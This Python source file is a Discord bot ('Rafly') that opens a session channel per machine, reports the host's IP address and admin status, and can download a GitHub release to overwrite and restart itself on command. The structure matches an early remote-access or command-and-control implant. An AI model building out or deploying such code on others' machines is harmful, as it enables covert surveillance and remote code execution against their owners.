import discord
import asyncio
import socket
import os
import getpass
import aiohttp
import zipfile
import shutil
import sys
import time

# Replace with your bot token
TOKEN = 'Your Bot Token'

intents = discord.Intents.default()
intents.message_content = True  # Enable message content intents
client = discord.Client(intents=intents)

# Determine the script's directory and config file path
script_dir = os.path.dirname(os.path.abspath(__file__))
config_path = os.path.join(script_dir, 'config.txt')

# Global variables to store the channel ID and bot token
channel_id = None

# Command prefix
PREFIX = '!'

async def get_or_create_channel():
  """Check for existing channel ID in config file or create a new session channel."""
  global channel_id, TOKEN
  guild = discord.utils.get(client.guilds)

  # Check if the configuration file exists
  if os.path.exists(config_path):
    with open(config_path, 'r') as config_file:
      lines = config_file.readlines()
      if len(lines) >= 2:
        channel_id = int(lines[0].strip())
        TOKEN = lines[1].strip()
        channel = guild.get_channel(channel_id)
        if channel:
          return channel

  # Determine the lowest available session number
  session_number = 1
  existing_channels = [channel.name for channel in guild.channels]
  while f'session-{session_number}' in existing_channels:
    session_number += 1

  # Check if the "Sessions" category exists, create if it doesn't
  category = discord.utils.get(guild.categories, name="Sessions")
  if category is None:
    category = await guild.create_category("Sessions")

  # Create a new channel under the "Sessions" category
  new_channel = await guild.create_text_channel(f'session-{session_number}', category=category)

  # Write the new channel ID and bot token to the configuration file
  channel_id = new_channel.id
  with open(config_path, 'w') as config_file:
    config_file.write(f"{channel_id}\n{TOKEN}")

  return new_channel

async def send_session_message(channel):
  """Send a session message to the specified channel."""
  # Get the IP address of the machine
  hostname = socket.gethostname()
  ip_address = socket.gethostbyname(hostname)

  # Check if the script is running with admin privileges
  is_admin = os.getuid() == 0 if os.name != 'nt' else os.system("net session >nul 2>&1") == 0

  # Create the embed message
  embed = discord.Embed(title="New Session Enabled! 👋", color=0x00ff00)
  embed.add_field(name="IP Address", value=f"```{ip_address}```", inline=False)
  embed.add_field(name="Admin Privileges", value="Yes" if is_admin else "No", inline=False)

  # Send the embed message to the channel
  await channel.send(embed=embed)

async def handle_hello_command(message):
  """Handles the hello command."""
  await message.channel.send('Hello! How can I assist you today?')

async def handle_status_command(message):
  """Handles the status command."""
  await message.channel.send('Bot is running and ready to assist!')

async def handle_help_command(message):
  """Handles the help command."""
  embed = discord.Embed(title="Help - Command List", color=0x00ff00)
  for command, func in command_handlers.items():
    embed.add_field(name=f"!{command}", value=func.__doc__, inline=False)
  await message.channel.send(embed=embed)

async def handle_unknown_command(message):
  """Handles unknown commands."""
  await message.channel.send('I did not understand that command.')

async def handle_update_command(message):
  """Handles the update command."""
  await message.channel.send('Updating the bot...')

  # Save important information to the config file
  save_config()

  # Download the latest release from GitHub
  if await download_latest_release():
    # Restart the bot with the new script
    restart_bot()
  else:
    await message.channel.send('Failed to download the latest release.')

def save_config():
  """Save important information to the config file."""
  with open(config_path, 'w') as config_file:
    config_file.write(f"{channel_id}\n{TOKEN}")

async def download_latest_release():
  """Download the latest release of the bot from GitHub."""
  releases_url = 'https://api.github.com/repos/Blast0ff/Rafly/releases/latest'
  print(f"Fetching latest release info from {releases_url}")

  async with aiohttp.ClientSession() as session:
    async with session.get(releases_url) as response:
      if response.status == 200:
        release_info = await response.json()
        zip_url = release_info['zipball_url']
        zip_path = os.path.join(script_dir, 'bot.zip')
        print(f"Downloading latest release from {zip_url}")

        async with session.get(zip_url) as zip_response:
          if zip_response.status == 200:
            print("Download successful, saving to file.")
            with open(zip_path, 'wb') as file:
              file.write(await zip_response.read())

            try:
              print("Extracting zip file.")
              with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(script_dir)
              os.remove(zip_path)
              print("Extraction successful.")
              return True
            except zipfile.BadZipFile:
              print("Bad zip file, removing.")
              os.remove(zip_path)
              return False
          else:
            print(f"Failed to download file, status code: {zip_response.status}")
            return False
      else:
        print(f"Failed to fetch release info, status code: {response.status}")
        return False

def restart_bot():
  """Restart the bot with the new script."""
  # Find the new script file
  new_script_path = None
  for root, dirs, files in os.walk(script_dir):
    for file in files:
      if file == 'Rafly.py' and root != script_dir:
        new_script_path = os.path.join(root, file)
        break
    if new_script_path:
      break

  if new_script_path:
    print(f"Restarting bot with new script: {new_script_path}")
    shutil.copyfile(new_script_path, __file__)
    os.remove(new_script_path)
    os.execv(sys.executable, [sys.executable] + sys.argv)
  else:
    print("No new script file found to restart the bot.")

# Dictionary to map commands to their corresponding handler functions
command_handlers = {
  'hello': handle_hello_command,
  'status': handle_status_command,
  'help': handle_help_command,
  'update client': handle_update_command,
}

@client.event
async def on_ready():
  """Handles the bot being ready."""
  print(f'Logged in as {client.user.name}')
  
  # Get or create the appropriate channel
  channel = await get_or_create_channel()

  # Send the session message to the channel
  await send_session_message(channel)

@client.event
async def on_message(message):
  """Handles incoming messages."""
  global channel_id

  # Ignore messages from the bot itself
  if message.author == client.user:
    return

  # Check if the message is in the specific channel
  if message.channel.id == channel_id:
    # Check if the message starts with the prefix
    if message.content.startswith(PREFIX):
      # Remove the prefix and split the message into command and arguments
      command = message.content[len(PREFIX):].strip().lower()

      # Get the command handler from the dictionary and execute it
      handler = command_handlers.get(command)
      if handler:
        await handler(message)
      else:
        await handle_unknown_command(message)

# Read the bot token from the config file if it exists
if os.path.exists(config_path):
  with open(config_path, 'r') as config_file:
    lines = config_file.readlines()
    if len(lines) >= 2:
      channel_id = int(lines[0].strip())
      TOKEN = lines[1].strip()

# Run the bot
client.run(TOKEN)
